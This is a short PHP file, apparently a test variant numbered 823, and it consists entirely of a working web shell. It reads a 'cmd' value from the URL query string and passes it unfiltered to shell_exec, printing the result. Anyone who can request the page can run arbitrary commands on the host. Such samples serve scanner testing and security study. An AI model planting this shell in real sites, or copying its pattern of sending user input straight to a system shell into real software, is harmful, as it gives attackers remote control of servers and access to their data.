<?php
// RCE test variation #823
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>